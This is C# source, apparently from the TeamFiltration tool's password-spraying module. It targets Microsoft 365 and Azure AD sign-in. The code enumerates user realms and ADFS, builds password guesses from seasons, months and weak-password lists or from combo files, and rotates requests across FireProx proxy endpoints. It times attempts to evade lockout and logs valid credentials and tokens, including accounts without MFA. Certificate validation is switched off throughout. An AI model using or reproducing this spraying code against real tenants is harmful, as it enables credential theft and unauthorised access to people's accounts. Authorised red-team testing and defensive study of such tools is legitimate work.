using Dasync.Collections;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Security.Authentication;
using System.Threading;
using System.Threading.Tasks;
using TeamFiltration.Handlers;
using TeamFiltration.Helpers;
using TeamFiltration.Models.TeamFiltration;
using System.Text.RegularExpressions;
using TeamFiltration.Models.MSOL;

namespace TeamFiltration.Modules
{
    class Spray
    {
        private static async Task<bool> CheckForAdfs(string email, GlobalArgumentsHandler _globalProperties)
        {

            var url = _globalProperties.GetFireProxURL().Replace("common/oauth2/token", $"getuserrealm.srf?login={email}&xml=1");

            var proxy = new WebProxy
            {
                Address = new Uri($"http://127.0.0.1:8080"),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false
            };

            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {
                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
                UseProxy = _globalProperties.DebugMode
            };

            using (var clientHttp = new HttpClient(httpClientHandler))
            {

                var getAsyncReq = await clientHttp.GetAsync(url);

                if (getAsyncReq.IsSuccessStatusCode)
                {
                    var postAsyncResp = await getAsyncReq.Content.ReadAsStringAsync();

                    if (postAsyncResp.Contains("/adfs/ls/?username"))
                    {
                        return true;
                    }

                }
            }

            return false;


        }

        private static async Task<UserRealmResp> CheckUserRealm(string email, GlobalArgumentsHandler _globalProperties)
        {
            var userRealObject = new UserRealmResp() { };

            var url = _globalProperties.GetFireProxURL().Replace("common/oauth2/token", $"getuserrealm.srf?login={email}&xml=1");
            var UsGovUrl = _globalProperties.TeamFiltrationConfig.MsolFireProxEndpointsUs[0].Replace("common/oauth2/token", $"getuserrealm.srf?login={email}&xml=1");

            var proxy = new WebProxy
            {
                Address = new Uri($"http://127.0.0.1:8080"),
                BypassProxyOnLocal = false,
                UseDefaultCredentials = false
            };

            var httpClientHandler = new HttpClientHandler
            {
                Proxy = proxy,
                ServerCertificateCustomValidationCallback = (message, xcert, chain, errors) =>
                {
                    return true;
                },
                SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls11 | SslProtocols.Tls,
                UseProxy = _globalProperties.DebugMode
            };

            using (var clientHttp = new HttpClient(httpClientHandler))
            {

                var getAsyncReq = await clientHttp.GetAsync(url);

                if (getAsyncReq.IsSuccessStatusCode)
                {
                    var userRealmData = await getAsyncReq.Content.ReadAsStringAsync();

                    Regex authUrlRegex = new Regex(@"(?<=<AuthUrl>)(.*?)(?=<\/AuthUrl>)", RegexOptions.Compiled | RegexOptions.IgnoreCase);
                    MatchCollection authUrlMatches = authUrlRegex.Matches(userRealmData);
                    if (authUrlMatches.Count > 0)
                    {

                        var AuthUrl = authUrlMatches[0].Value;
                        userRealObject.ThirdPartyAuthUrl = AuthUrl;
                        userRealObject.ThirdPartyAuth = true;
                    }
                    if (userRealmData.Contains("/adfs/ls/?username"))
                        userRealObject.Adfs = true;

                }

                var getAsyncUsGovReq = await clientHttp.GetAsync(UsGovUrl);

                if (getAsyncUsGovReq.IsSuccessStatusCode)
                {
                    var userRealmData = await getAsyncUsGovReq.Content.ReadAsStringAsync();

                    Regex UsGovRegex = new Regex(@"(?<=<CloudInstanceName>)(.*?)(?=<\/CloudInstanceName>)", RegexOptions.Compiled | RegexOptions.IgnoreCase);
                    MatchCollection usGovMatches = UsGovRegex.Matches(userRealmData);
                    if (usGovMatches.Count > 0)
                    {
                        var usGovUrl = usGovMatches[0].Value;
                        if (usGovUrl.Contains("microsoftonline.us"))
                            userRealObject.UsGovCloud = true;
                    }

                }
            }

            return userRealObject;
        }


        private static async Task SprayAttemptWrap(SprayAttempt sprayAttempt, GlobalArgumentsHandler teamFiltrationConfig, DatabaseHandler _databaseHandler, UserRealmResp userRealmResp)
        {

            var _mainMSOLHandler = new MSOLHandler(teamFiltrationConfig, "SPRAY");
            var _checkMSOLHandler = new MSOLHandler(teamFiltrationConfig, "SPRAY");



            try
            {
                var loginResp = await _mainMSOLHandler.LoginSprayAttempt(sprayAttempt, userRealmResp);

                if (!string.IsNullOrWhiteSpace(loginResp.bearerToken?.access_token))
                {
                    if (userRealmResp.Adfs)
                        _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => VALID!", sprayAttempt.FireProxRegion));
                    else
                        _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => VALID NO MFA!", sprayAttempt.FireProxRegion));
                    sprayAttempt.ResponseData = JsonConvert.SerializeObject(loginResp.bearerToken);
                    sprayAttempt.Valid = true;

                }
                else if (!string.IsNullOrWhiteSpace(loginResp.bearerTokenError?.error_description))
                {
                    var respCode = loginResp.bearerTokenError.error_description.Split(":")[0].Trim();
                    var message = loginResp.bearerTokenError.error_description.Split(":")[1].Trim();

                    //Set a default response
                    var errorCodeOut = (msg: $"UNKNOWN {respCode}", valid: false, disqualified: false, accessPolicy: false);

                    //Try to parse
                    Helpers.Generic.GetErrorCodes().TryGetValue(respCode, out errorCodeOut);

                    //Write result
                    var printLogBool = (errorCodeOut.accessPolicy || errorCodeOut.valid || errorCodeOut.disqualified);

                    if (!string.IsNullOrEmpty(errorCodeOut.msg))
                        _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => {errorCodeOut.msg}", sprayAttempt.FireProxRegion), true, true);
                    else
                        _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => {respCode.Trim()}", sprayAttempt.FireProxRegion), true, true);

                    //If we get a valid response, parse and set the token data as json
                    if (errorCodeOut.valid)
                        sprayAttempt.ResponseData = JsonConvert.SerializeObject(loginResp.bearerToken);

                    sprayAttempt.ResponseCode = respCode;
                    sprayAttempt.Valid = errorCodeOut.valid;
                    sprayAttempt.Disqualified = errorCodeOut.disqualified;
                    sprayAttempt.ConditionalAccess = errorCodeOut.accessPolicy;

                }
                else
                {
                    _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => UNKNOWN or malformed response!", sprayAttempt.FireProxRegion));

                }

                _databaseHandler.WriteSprayAttempt(sprayAttempt);
            }
            catch (Exception ex)
            {
                _databaseHandler.WriteLog(new Log("SPRAY", $"SOFT ERROR when spraying  {sprayAttempt.Username}:{sprayAttempt.Password} => {ex.Message}", sprayAttempt.FireProxRegion));

            }
            _databaseHandler._globalDatabase.Checkpoint();





        }
        private static async Task SprayAttemptWrap(List<SprayAttempt> sprayAttempts, GlobalArgumentsHandler teamFiltrationConfig, DatabaseHandler _databaseHandler, UserRealmResp userRealmResp, int delayInSeconds = 0)
        {

            var _mainMSOLHandler = new MSOLHandler(teamFiltrationConfig, "SPRAY");
            var _checkMSOLHandler = new MSOLHandler(teamFiltrationConfig, "SPRAY");


            await sprayAttempts.ParallelForEachAsync(
                  async sprayAttempt =>
                          {
                              try
                              {
                                  var loginResp = await _mainMSOLHandler.LoginSprayAttempt(sprayAttempt, userRealmResp);

                                  if (!string.IsNullOrWhiteSpace(loginResp.bearerToken?.access_token))
                                  {
                                      _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => VALID NO MFA!", sprayAttempt.FireProxRegion));
                                      sprayAttempt.ResponseData = JsonConvert.SerializeObject(loginResp.bearerToken);
                                      sprayAttempt.Valid = true;

                                  }
                                  else if (!string.IsNullOrWhiteSpace(loginResp.bearerTokenError?.error_description))
                                  {
                                      var respCode = loginResp.bearerTokenError.error_description.Split(":")[0].Trim();
                                      var message = loginResp.bearerTokenError.error_description.Split(":")[1].Trim();

                                      //Set a default response
                                      var errorCodeOut = (msg: $"UNKNOWN {respCode}", valid: false, disqualified: false, accessPolicy: false);

                                      //Try to parse
                                      Helpers.Generic.GetErrorCodes().TryGetValue(respCode, out errorCodeOut);

                                      //Write result
                                      var printLogBool = (errorCodeOut.accessPolicy || errorCodeOut.valid || errorCodeOut.disqualified);

                                      if (!string.IsNullOrEmpty(errorCodeOut.msg))
                                          _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => {errorCodeOut.msg}", sprayAttempt.FireProxRegion), true, true);
                                      else
                                          _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => {respCode.Trim()}", sprayAttempt.FireProxRegion), true, true);

                                      //If we get a valid response, parse and set the token data as json
                                      if (errorCodeOut.valid)
                                          sprayAttempt.ResponseData = JsonConvert.SerializeObject(loginResp.bearerToken);

                                      sprayAttempt.ResponseCode = respCode;
                                      sprayAttempt.Valid = errorCodeOut.valid;
                                      sprayAttempt.Disqualified = errorCodeOut.disqualified;
                                      sprayAttempt.ConditionalAccess = errorCodeOut.accessPolicy;

                                  }
                                  else
                                  {
                                      _databaseHandler.WriteLog(new Log("SPRAY", $"Sprayed {sprayAttempt.Username}:{sprayAttempt.Password} => UNKNOWN or malformed response!", sprayAttempt.FireProxRegion));

                                  }

                                  _databaseHandler.WriteSprayAttempt(sprayAttempt);
                                  Thread.Sleep(delayInSeconds * 1000);
                              }
                              catch (Exception ex)
                              {
                                  _databaseHandler.WriteLog(new Log("SPRAY", $"SOFT ERROR when spraying  {sprayAttempt.Username}:{sprayAttempt.Password} => {ex.Message}", sprayAttempt.FireProxRegion));

                              }
                              _databaseHandler._globalDatabase.Checkpoint();
                          },
                            maxDegreeOfParallelism: 3);




        }
        public static async Task SprayAsync(string[] args)
        {
            var alertMsg = true;
            var forceBool = args.Contains("--force");
            var aadSSO = args.Contains("--aad-sso");

            int sleepInMinutesMax = 100;
            int sleepInMinutesMin = 60;
            int delayInSeconds = 0;

            string StarTime = "";
            string StopTime = "";


            var passwordListPath = args.GetValue("--passwords");
            var exludeListPath = args.GetValue("--exlude");
            var comboListPath = args.GetValue("--combo");

            List<string> passwordList = new List<string>() { };

            string[] excludeList = new string[] { };

            var _globalProperties = new Handlers.GlobalArgumentsHandler(args);

            var databaseHandle = new DatabaseHandler(_globalProperties);

            //Calcuate time format for spraying to happen
            if (args.Contains("--time-window"))
            {
                var rawInputTime = args.GetValue("--time-window");

                StarTime = rawInputTime.Trim().Split("-")[0];
                StopTime = rawInputTime.Trim().Split("-")[1];

                databaseHandle.WriteLog(new Log("SPRAY", $"Spraying will only occur between {StarTime}-{StopTime}"));
            }

            //Calcuate sleep time from minutes to ms
            if (args.Contains("--sleep-max"))
            {
                sleepInMinutesMax = Convert.ToInt32(args.GetValue("--sleep-max"));
            }

            if (args.Contains("--sleep-min"))
            {
                sleepInMinutesMin = Convert.ToInt32(args.GetValue("--sleep-min"));
            }

            if (args.Contains("--delay"))
            {
                delayInSeconds = Convert.ToInt32(args.GetValue("--delay"));
            }
            else
            {
                delayInSeconds = 0;
            }

            databaseHandle.WriteLog(new Log("SPRAY", $"Sleeping between {sleepInMinutesMin}-{sleepInMinutesMax} minutes for each round"!));

            if (!string.IsNullOrEmpty(exludeListPath))
            {
                excludeList = File.ReadAllLines(exludeListPath).Select(x => x.ToLower().Trim()).ToArray();
                databaseHandle.WriteLog(new Log("SPRAY", $"Exlcuding {excludeList.Count()} emails"!));
            }

            if (string.IsNullOrEmpty(passwordListPath))
            {
                if (args.Contains("--seasons-only"))
                    passwordList.AddRange(Helpers.Generic.GenerateSeasonPasswords());

                if (args.Contains("--months-only"))
                    passwordList.AddRange(Helpers.Generic.GenerateMonthsPasswords());

                if (args.Contains("--common-only"))
                    passwordList.AddRange(Helpers.Generic.GenerateWeakPasswords());

                //By Default do months and seasons
                if (passwordList.Count() == 0)
                {
                    passwordList.AddRange(Helpers.Generic.GenerateMonthsPasswords());
                    passwordList.AddRange(Helpers.Generic.GenerateMonthsPasswords());
                }

            }
            else if (File.Exists(passwordListPath))
                passwordList = File.ReadAllLines(passwordListPath).ToList();

            //Get a list of nice valid users from the DB
            string[] userNameListGlobal = databaseHandle.QueryValidAccount().Select(x => x.Username.ToLower()).ToArray();


            var getUserRealmResult = await CheckUserRealm(userNameListGlobal.FirstOrDefault(), _globalProperties);

            if (getUserRealmResult.UsGovCloud)
            {
                databaseHandle.WriteLog(new Log("SPRAY", $"US GOV Tenant detected - Updating spraying endpoint from .com => .us"));
                _globalProperties.UsCloud = true;
            }

            if (getUserRealmResult.ThirdPartyAuth && !getUserRealmResult.Adfs)
            {
                databaseHandle.WriteLog(new Log("SPRAY", $"Third party authentication detected - Spraying will potentially not work properly, sorry!\nThird-Party Authentication url: " + getUserRealmResult.ThirdPartyAuthUrl));
                Environment.Exit(0);
            }


            //Check if this client has ADFS
            if (getUserRealmResult.Adfs && !aadSSO)
            {
                databaseHandle.WriteLog(new Log("SPRAY", $"ADFS detected, TeamFiltration ADFS support in early beta, be carefull :) "));

            }


            //Remove user exlucde users.
            userNameListGlobal = userNameListGlobal.Except(excludeList).ToArray();


            //Generate a random sleep time based on min-max
            var currentSleepTime = (new Random()).Next(sleepInMinutesMin, sleepInMinutesMax);


            if (!string.IsNullOrEmpty(comboListPath))
            {
                if (File.Exists(comboListPath))
                {

                    var nonSprayed = new List<string> { };
                    var sprayed = new List<string> { };

                    var apiIndexCounter = 0;

                    foreach (var userCombo in File.ReadAllLines(comboListPath)?.Where(x => !string.IsNullOrEmpty(x)))
                    {
                        var randomResource = Helpers.Generic.RandomO365Res();

                        var fireProxUrl = _globalProperties.TeamFiltrationConfig.MsolFireProxEndpoints[apiIndexCounter];

                        if (aadSSO)
                            fireProxUrl = _globalProperties.TeamFiltrationConfig.AadSSoFireProxEndpoints[apiIndexCounter];

                        if (_globalProperties.UsCloud)
                            fireProxUrl = _globalProperties.TeamFiltrationConfig.MsolFireProxEndpointsUs[apiIndexCounter];

                        var sprayBuff = new SprayAttempt()
                        {

                            Username = userCombo.Split(":")[0],
                            Password = userCombo.Split(":")[1],
                            FireProxURL = fireProxUrl,
                            FireProxRegion = fireProxUrl.Split('.')[2].Split('.')[0],
                            ResourceClientId = randomResource.clientId,
                            ResourceUri = randomResource.Uri,
                            AADSSO = aadSSO,
                            ADFS = getUserRealmResult.Adfs
                        };


                        if (!sprayed.Select(x => x.Split(":")[0].ToLower()).Contains(userCombo.Split(":")[0].ToLower()))
                        {
                            await SprayAttemptWrap(sprayBuff, _globalProperties, databaseHandle, getUserRealmResult);
                            sprayed.Add(userCombo);
                            Thread.Sleep(delayInSeconds * 1000);
                        }
                        else
                            nonSprayed.Add(userCombo);

                    }

                    File.WriteAllLines(comboListPath.Replace(".txt", "_extra.txt"), nonSprayed);
                }
                else
                {
                    databaseHandle.WriteLog(new Log("SPRAY", $"Combo list path does not exist. Check your path."));
                    Environment.Exit(1);
                }

            }
            else
            {

                //Counter to rotate over the FireProx API endspoints
                var apiIndexCounter = 0;

                int forceCount = 0;

                foreach (string password in passwordList)
                {
                    //We need to do this every round beacuse stuff can change during the spray!
                    var listOfSprayAttempts = new List<SprayAttempt>() { };

                    //Query disabled accounts
                    List<SprayAttempt> diqualifiedAccounts = databaseHandle.QueryDisqualified();

                    //Remove those disabled accounts, no need to spray with these
                    var bufferuserNameList = userNameListGlobal.Except(diqualifiedAccounts.Select(x => x.Username.ToLower())).ToArray();

                    //If we don't have any users now, we won't get any new ones during spray. Let's exit
                    if (bufferuserNameList.Count() == 0)
                    {
                        databaseHandle.WriteLog(new Log("SPRAY", $"There are NO non-disqualified emails to spray, go back and enum more!"));
                        Environment.Exit(0);
                    }



                    //Generate those combinations super fast!
                    await bufferuserNameList.ParallelForEachAsync(
                    async userName =>
                    {
                        //Check if this combo exsists in the DB
                        var randomResource = Helpers.Generic.RandomO365Res();

                        var bufferHash = Helpers.Generic.CreateMD5(userName.ToLower() + ":" + password);

                        //If this combo does NOT exsits, add it
                        if (!databaseHandle.QueryComboHash(bufferHash))
                        {

                            var fireProxUrl = _globalProperties.TeamFiltrationConfig.MsolFireProxEndpoints[apiIndexCounter];

                            if (aadSSO)
                                fireProxUrl = _globalProperties.TeamFiltrationConfig.AadSSoFireProxEndpoints[apiIndexCounter];

                            if (_globalProperties.UsCloud)
                                fireProxUrl = _globalProperties.TeamFiltrationConfig.MsolFireProxEndpointsUs[apiIndexCounter];

                            listOfSprayAttempts.Add(new SprayAttempt()
                            {

                                Username = userName,
                                Password = password,
                                ComboHash = bufferHash,
                                FireProxURL = fireProxUrl,
                                FireProxRegion = fireProxUrl.Split('.')[2].Split('.')[0],
                                ResourceClientId = randomResource.clientId,
                                ResourceUri = randomResource.Uri,
                                AADSSO = aadSSO,
                                ADFS = getUserRealmResult.Adfs
                            });
                        }
                    },
                      maxDegreeOfParallelism: 500);

                    if ((_globalProperties.TeamFiltrationConfig.MsolFireProxEndpoints.Count() - 1) == apiIndexCounter)
                        apiIndexCounter = 0;
                    else if ((_globalProperties.TeamFiltrationConfig.AadSSoFireProxEndpoints.Count() - 1) == apiIndexCounter)
                        apiIndexCounter = 0;
                    else
                        apiIndexCounter++;

                    if (listOfSprayAttempts.Count() > 0)
                    {
                        //Remove accounts that cannot be sprayed due to time-limit
                        var mostRecentAccountSprayed = new DateTime();

                        //Get the most recent account sprayed
                        var recentAccountsSprayed = databaseHandle.QuerySprayAttempts(currentSleepTime).OrderByDescending(x => x?.DateTime).ToArray();

                        //If there where any recent sprayed accounts, use that time
                        if (recentAccountsSprayed.Count() > 0)
                        {
                            //If there was, get the datetime of that spray attempt
                            mostRecentAccountSprayed = databaseHandle.QuerySprayAttempts(currentSleepTime).OrderByDescending(x => x?.DateTime).FirstOrDefault().DateTime;
                        }
                        else
                        {
                            //If not, just use this dummy time so we can spray
                            mostRecentAccountSprayed = DateTime.Now.AddDays(-1);
                        }

                        int minutesSinceFirstAccountSprayed = Convert.ToInt32(DateTime.Now.Subtract(mostRecentAccountSprayed).TotalMinutes);

                        int timeLeftToSleep = currentSleepTime - minutesSinceFirstAccountSprayed;

                        if (timeLeftToSleep > 0)
                        {
                            if (forceCount == 1)
                                forceBool = false;

                            if (forceBool)
                            {
                                if (alertMsg)
                                {
                                    databaseHandle.WriteLog(new Log("SPRAY", $"There has only been {minutesSinceFirstAccountSprayed} minutes since last spray, be careful about lockout!"));
                                    alertMsg = false;
                                    forceCount++;
                                }

                            }
                            else
                            {
                                databaseHandle.WriteLog(new Log("SPRAY", $"Sleeping the remaining {timeLeftToSleep} since last spray (Use --force to overrule)!"));
                                Thread.Sleep((int)TimeSpan.FromMinutes(timeLeftToSleep).TotalMilliseconds);
                            }
                        }

                        //If we have any accounts left, spray them

                        if (args.Contains("--time-window"))
                        {
                            bool prompted = false;
                            while (true)
                            {
                                if (!Helpers.Generic.TimeToSleep(StarTime, StopTime))
                                    break;
                                if (!prompted)
                                    databaseHandle.WriteLog(new Log("SPRAY", $"Pausing spraying until {StarTime}"));
                                Thread.Sleep(50000);
                                prompted = true;
                            }
                        }
                        await SprayAttemptWrap(listOfSprayAttempts, _globalProperties, databaseHandle, getUserRealmResult, delayInSeconds);
                    }
                }
            }

        }

    }

}

